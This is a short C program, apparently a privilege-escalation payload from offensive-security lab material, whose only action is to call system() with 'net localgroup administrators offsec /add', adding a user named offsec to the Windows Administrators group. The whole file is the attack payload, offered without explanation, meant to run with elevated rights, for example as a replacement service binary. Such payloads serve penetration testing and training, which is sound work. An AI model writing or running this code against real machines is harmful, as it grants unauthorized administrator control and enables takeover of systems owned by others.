#include <stdlib.h> 
int main () {
    int i;
    i = system ("net localgroup administrators offsec /add");
    return 0;
}